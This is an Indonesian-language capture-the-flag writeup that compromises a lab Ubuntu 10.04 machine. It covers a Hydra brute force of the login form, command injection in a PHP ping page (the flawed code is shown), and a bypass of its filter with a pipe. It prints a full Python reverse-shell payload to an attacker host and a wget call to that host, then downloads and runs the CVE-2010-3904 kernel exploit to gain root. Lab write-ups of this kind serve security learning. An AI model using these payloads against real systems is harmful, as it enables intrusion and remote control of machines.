

Target: 10.1.2.109

# 1. Pendahuluan

Dokumen ini merupakan writeup resmi dari proses penetration testing terhadap mesin CTF dengan alamat IP 10.1.2.109. Mesin ini dikenal memiliki karakteristik unik yakni pemiliknya sengaja menantang para penyerang dengan berbagai jebakan dan respons ejekan, sesuai dengan narasi "Get ready to be teased".

|**Parameter**|**Detail**|
|---|---|
|Target IP|10.1.2.109|
|Sistem Operasi|Ubuntu 10.04 (Lucid Lynx)|
|Web Server|Apache 2.2.14 (Ubuntu)|
|PHP Version|PHP 5.3.2-1ubuntu4.30|
|Tingkat Kesulitan|Moderate|
|Tujuan|User Flag + Root Flag|

# 2. Reconnaissance

## 2.1 Pemindaian Port (Nmap)

Pemindaian awal dilakukan menggunakan Nmap untuk mengidentifikasi layanan yang berjalan pada target.

```bash
nmap -sV -sC -p- 10.1.2.109
```

**Hasil pemindaian menunjukkan dua port terbuka:**

|**Port**|**Layanan**|**Versi**|**Keterangan**|
|---|---|---|---|
|22/tcp|SSH|OpenSSH 5.3p1 Debian 3ubuntu7.1|Host Key: RSA, DSA|
|80/tcp|HTTP|Apache httpd 2.2.14 (Ubuntu)|Title: Full of Shit|

## 2.2 Analisis Layanan Web

Halaman utama pada port 80 menampilkan form login pada path /index.php. Analisis terhadap source code HTML halaman tersebut mengungkap komentar yang bocor:

<!-- Login admin --!>

Meskipun sintaks komentar HTML tersebut salah (seharusnya -->), informasi ini mengonfirmasi bahwa username yang digunakan adalah admin.

# 3. Eksploitasi

## 3.1 Percobaan SQL Injection

Percobaan SQL Injection dilakukan menggunakan payload umum pada form login:

user=admin'OR'1'='1&pass=apapun&Login=

Percobaan ini tidak berhasil. Server merespons dengan pesan ejekan:

<script>alert('Uh Oh Shit!')</script>

Berdasarkan versi PHP 5.3.2 yang digunakan, kemungkinan terdapat filtering sederhana pada input. Diputuskan untuk beralih ke metode brute force.

## 3.2 Brute Force Credential — Hydra

Menggunakan informasi username admin yang diperoleh dari komentar HTML, dilakukan serangan brute force menggunakan Hydra dengan wordlist rockyou.txt. Fail string yang digunakan adalah teks yang muncul saat login gagal.

```bash
hydra -l admin -P /home/greed/rockyou.txt 10.1.2.109 \

  http-post-form "/index.php:user=^USER^&pass=^PASS^&Login=:Uh Oh Shit" \

  -V -t 30
```

|**Parameter**|**Nilai**|**Keterangan**|
|---|---|---|
|-l admin|admin|Username yang sudah diketahui dari komentar HTML|
|-P rockyou.txt|rockyou.txt|Wordlist password populer|
|http-post-form|POST Form|Metode pengiriman request|
|:Uh Oh Shit|Fail String|String penanda login GAGAL|
|-t 30|30 Thread|Jumlah koneksi paralel|

**Hasil brute force berhasil menemukan kredensial valid:**

[80][http-post-form] host: 10.1.2.109  login: admin  password: hahaha

Kredensial: admin / hahaha — sesuai dengan tema ejekan mesin ini.

## 3.3 OS Command Injection — /f0s.php

### 3.3.1 Identifikasi Vulnerability

Setelah login, pengguna diarahkan ke halaman /f0s.php yang memiliki fitur ping ke IP Address. Source code PHP yang ditemukan adalah sebagai berikut:

```php
<?php

$ip = $_POST['ip'];

if (isset($_POST['ip'])){

    if (preg_match("/&&/",$ip)){

        echo "<script>alert('Huh??')</script>";

    } else {

        echo "<pre>";

        system("ping " .$ip. " -c3");  // <-- VULNERABLE

        echo "</pre>";

        die;

    }

}

?>
```

**Terdapat tiga kesalahan fatal dalam kode tersebut:**

•       Filter blacklist yang sangat lemah — hanya memblokir karakter && sehingga karakter pipe (|), titik koma (;), dan newline (%0a) lolos tanpa hambatan.

•       Input pengguna langsung dimasukkan ke fungsi system() tanpa sanitasi, sehingga apapun yang diketikkan pengguna akan dieksekusi oleh sistem operasi.

•       Tidak ada validasi format IP Address — input tidak diverifikasi apakah benar-benar berupa alamat IP valid.

### 3.3.2 Bypass Filter dan Eksekusi Perintah

Percobaan menggunakan && diblokir. Namun pengujian menggunakan karakter pipe (|) berhasil:

```bash
|wget http://10.18.200.142/80.txt
```

Perintah wget berhasil dieksekusi, membuktikan command injection aktif. Perlu dicatat bahwa command system("ping " . $ip . " -c3") menyebabkan argumen -c3 menempel pada perintah yang diinjeksikan. Untuk menetralisir hal ini, karakter komentar (#) ditambahkan di akhir payload:

```bash
|whoami #
```

Output yang dihasilkan: www-data — mengonfirmasi eksekusi perintah berhasil.

### 3.3.3 Reverse Shell

Listener netcat disiapkan pada mesin penyerang, kemudian payload reverse shell Python diinjeksikan:

# Listener di mesin attacker

```bash
nc -lvnp 4444
```

# Payload yang diinjeksikan pada field ip:

```python
|python -c 'import socket,subprocess,os;s=socket.socket();

 s.connect(("10.18.200.142",4444));os.dup2(s.fileno(),0);

 os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);

 subprocess.call(["/bin/bash","-i"])' #
```

Reverse shell berhasil diperoleh sebagai pengguna www-data. User flag berhasil ditemukan dan dikumpulkan.

# 4. Privilege Escalation

## 4.1 Identifikasi CVE-2010-3904 (RDS Kernel Exploit)

Enumerasi sistem menggunakan tools seperti linux-exploit-suggester mengidentifikasi kernel yang sangat rentan:

|**Atribut**|**Detail**|
|---|---|
|CVE|CVE-2010-3904|
|Nama Exploit|RDS (Reliable Datagram Sockets) Exploit|
|Tag Target|ubuntu=10.04{kernel:2.6.32-(21\|24)-generic}|
|CVSS Score|7.8 (High)|
|Tipe|Local Privilege Escalation|
|Dampak|Arbitrary Kernel Memory Write → Root|

## 4.2 Analisis Teknis Vulnerability

CVE-2010-3904 merupakan kerentanan pada protokol RDS (Reliable Datagram Sockets) di Linux kernel. RDS adalah protokol komunikasi antar-proses yang dirancang untuk komunikasi cepat antar node dalam sebuah cluster.

**Fungsi yang rentan adalah rds_page_copy_user():**

```python
static int rds_page_copy_user(struct page *page, unsigned long uaddr,

                              void *contents, unsigned long bytes,

                              int to_user)

{

    // TIDAK ADA VALIDASI apakah uaddr adalah

    // user space atau kernel space address!

    unsigned long vaddr = (unsigned long)kmap(page);

    ret = copy_to_user((void __user *)uaddr, vaddr + offset, bytes);

}
```

**Mekanisme eksploitasi berjalan sebagai berikut:**

•       Penyerang membuat RDS socket dan mengirim RDS message dengan target address berupa alamat kernel memory.

•       Fungsi rds_page_copy_user() tidak melakukan validasi apakah address tersebut milik user space atau kernel space.

•       Kernel menulis data ke arbitrary kernel memory sesuai dengan address yang diberikan penyerang.

•       Penyerang meng-overwrite struktur uid/gid di dalam kernel, sehingga proses penyerang mendapat hak akses root (uid=0).

**Patch yang diterapkan menambahkan validasi access_ok():**

// Setelah patch — validasi address sebelum operasi:

```python
if (!access_ok(to_user ? VERIFY_WRITE : VERIFY_READ, uaddr, bytes))

    return -EFAULT;
```

## 4.3 Eksekusi Exploit

# Download exploit

```bash
wget http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
```

# Compile

```bash
gcc -o rds linux-rds-exploit.c
```

# Eksekusi

```bash
cd /tmp && ./rds
```

# Verifikasi

```bash
whoami
```

# root

Privilege escalation berhasil. Akses root diperoleh dan root flag berhasil dikumpulkan.

# 5. Ringkasan Attack Chain

|**Tahap**|**Teknik**|**Hasil**|
|---|---|---|
|1. Reconnaissance|Nmap scan + analisis HTML|Port 22, 80 terbuka. Username admin ditemukan dari komentar HTML.|
|2. Initial Access|Brute force Hydra (rockyou.txt)|Kredensial: admin / hahaha|
|3. Command Injection|OS Command Injection via \|pipe\| + bypass -c3 dengan #|Remote Code Execution sebagai www-data|
|4. Reverse Shell|Python reverse shell payload|Shell interaktif diperoleh + User Flag|
|5. Privilege Escalation|CVE-2010-3904 RDS Kernel Exploit|Root access + Root Flag|
